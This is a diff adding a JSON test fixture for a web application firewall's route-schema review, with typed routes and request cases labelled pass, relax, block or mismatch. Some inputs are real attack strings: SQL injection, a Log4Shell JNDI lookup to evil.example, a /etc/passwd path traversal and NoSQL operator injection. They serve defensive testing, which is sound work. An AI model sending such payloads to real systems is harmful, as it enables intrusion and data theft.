@@ -1,0 +1,312 @@
+{
+  "_comment": "Route schema reviews: a request to a route whose inputs init saved, after the general SQL and RCE check. pass: nothing found; relax: the general check's finding is cleared by the schema; block: the finding stands; mismatch: a typed input was sent with a value of another type. Run by aiwaf-rust, aiwaf-wasm (Node.js) and Java; path_cases are findings from the URL path, reviewed against the route's parameters.",
+  "manifest": {
+    "routes": {
+      "/comments": {
+        "view": "comments",
+        "inputs": {
+          "body": "text",
+          "post_id": "int"
+        },
+        "inputs_complete": true
+      },
+      "/search": {
+        "view": "search",
+        "inputs": {
+          "q": "text",
+          "page": "int"
+        },
+        "inputs_complete": true,
+        "injection_risks": [
+          {
+            "sink": "sql",
+            "input": "q",
+            "confidence": "high"
+          }
+        ]
+      },
+      "/notes": {
+        "view": "notes",
+        "inputs": {
+          "text": "text"
+        },
+        "inputs_complete": false
+      },
+      "/legacy": {
+        "view": "legacy",
+        "inputs": {
+          "text": "text"
+        },
+        "inputs_complete": true,
+        "injection_risks": [
+          {
+            "sink": "sql",
+            "input": "",
+            "confidence": "low"
+          }
+        ]
+      },
+      "/tokens/<id>": {
+        "view": "tokens",
+        "inputs": {
+          "token": "uuid",
+          "enabled": "bool",
+          "ratio": "float"
+        },
+        "inputs_complete": true
+      },
+      "/health": {
+        "view": "health"
+      },
+      "/posts/<slug>": {
+        "view": "post",
+        "inputs": {
+          "page": "int"
+        },
+        "inputs_complete": true
+      },
+      "/files/<path:name>": {
+        "view": "files",
+        "inputs": {},
+        "inputs_complete": true,
+        "injection_risks": [
+          {
+            "sink": "path",
+            "input": "name",
+            "confidence": "high"
+          }
+        ]
+      },
+      "/archive/<slug>": {
+        "view": "archive",
+        "inputs": {},
+        "inputs_complete": true,
+        "injection_risks": [
+          {
+            "sink": "sql",
+            "input": "",
+            "confidence": "low"
+          }
+        ]
+      },
+      "/orders/{order_id}": {
+        "view": "orders",
+        "inputs": {
+          "order_id": "int"
+        },
+        "inputs_complete": true
+      },
+      "/tickets/<uuid:ticket>": {
+        "view": "tickets",
+        "inputs": {},
+        "inputs_complete": true
+      }
+    }
+  },
+  "cases": [
+    {
+      "query": "",
+      "body": "{\"body\": \"use sleep(5) in the query\", \"post_id\": 7}",
+      "path": "/comments",
+      "expect": "relax"
+    },
+    {
+      "query": "",
+      "body": "body=we+dropped+tempdb&post_id=7",
+      "path": "/comments",
+      "expect": "relax"
+    },
+    {
+      "query": "body=char(65)%20is%20A",
+      "body": "",
+      "path": "/comments",
+      "expect": "relax"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"1 OR 1=1\"}",
+      "path": "/comments",
+      "expect": "relax"
+    },
+    {
+      "query": "utm_note=1%20union%20select%20password%20from%20users",
+      "body": "",
+      "path": "/comments",
+      "expect": "relax"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"admin' OR '1'='1\"}",
+      "path": "/comments",
+      "expect": "block"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"${jndi:ldap://evil.example/a}\"}",
+      "path": "/comments",
+      "expect": "block"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"use sleep(5)\", \"extra\": \"x' OR 'a'='a\"}",
+      "path": "/comments",
+      "expect": "block"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"hello\", \"post_id\": \"7 OR 1=1\"}",
+      "path": "/comments",
+      "expect": "mismatch",
+      "input": "post_id"
+    },
+    {
+      "query": "post_id=abc",
+      "body": "",
+      "path": "/comments",
+      "expect": "mismatch",
+      "input": "post_id"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"hello\", \"post_id\": \"42\"}",
+      "path": "/comments",
+      "expect": "pass"
+    },
+    {
+      "query": "token=0f8fad5b-d9cb-469f-a165-70867728950e&enabled=true&ratio=0.5",
+      "body": "",
+      "path": "/tokens/5",
+      "expect": "pass"
+    },
+    {
+      "query": "token=0f8fad5bd9cb469fa16570867728950e&enabled=on&ratio=-1e3",
+      "body": "",
+      "path": "/tokens/5",
+      "expect": "pass"
+    },
+    {
+      "query": "token=../../etc/passwd",
+      "body": "",
+      "path": "/tokens/5",
+      "expect": "mismatch",
+      "input": "token"
+    },
+    {
+      "query": "",
+      "body": "{\"enabled\": \"maybe\"}",
+      "path": "/tokens/5",
+      "expect": "mismatch",
+      "input": "enabled"
+    },
+    {
+      "query": "",
+      "body": "{\"ratio\": {\"$gt\": 0}}",
+      "path": "/tokens/5",
+      "expect": "mismatch",
+      "input": "ratio"
+    },
+    {
+      "query": "",
+      "body": "{\"ratio\": [1, 2.5], \"enabled\": false}",
+      "path": "/tokens/5",
+      "expect": "pass"
+    },
+    {
+      "query": "q=1%20OR%201%3D1",
+      "body": "",
+      "path": "/search",
+      "expect": "block"
+    },
+    {
+      "query": "q=shoes&page=2",
+      "body": "",
+      "path": "/search",
+      "expect": "pass"
+    },
+    {
+      "query": "page=2%20OR%201%3D1",
+      "body": "",
+      "path": "/search",
+      "expect": "mismatch",
+      "input": "page"
+    },
+    {
+      "query": "",
+      "body": "{\"text\": \"use sleep(5) in the query\"}",
+      "path": "/notes",
+      "expect": "block"
+    },
+    {
+      "query": "",
+      "body": "{\"text\": \"use sleep(5) in the query\"}",
+      "path": "/legacy",
+      "expect": "block"
+    },
+    {
+      "query": "",
+      "body": "<c>use sleep(5) in the query</c>",
+      "path": "/comments",
+      "expect": "block"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"use sleep(5) in the query\"}",
+      "path": "/health",
+      "expect": "block"
+    },
+    {
+      "query": "",
+      "body": "{\"body\": \"use sleep(5) in the query\"}",
+      "path": "/elsewhere",
+      "expect": "block"
+    }
+  ],
+  "path_cases": [
+    {
+      "path": "/posts/use-sleep(5)-in-queries",
+      "expect": "relax"
+    },
+    {
+      "path": "/posts/we%20dropped%20tempdb",
+      "expect": "relax"
+    },
+    {
+      "path": "/posts/1%20OR%201=1",
+      "expect": "relax"
+    },
+    {
+      "path": "/posts/x%27%20OR%20%271%27=%271",
+      "expect": "block"
+    },
+    {
+      "path": "/posts/hello",
+      "expect": "pass"
+    },
+    {
+      "path": "/files/1%20OR%201=1",
+      "expect": "block"
+    },
+    {
+      "path": "/archive/char(65)",
+      "expect": "block"
+    },
+    {
+      "path": "/orders/char(65)",
+      "expect": "mismatch",
+      "input": "order_id"
+    },
+    {
+      "path": "/orders/12",
+      "expect": "pass"
+    },
+    {
+      "path": "/tickets/char(65)",
+      "expect": "mismatch",
+      "input": "ticket"
+    },
+    {
+      "path": "/elsewhere/char(65)",
+      "expect": "block"
+    }
+  ]
+}
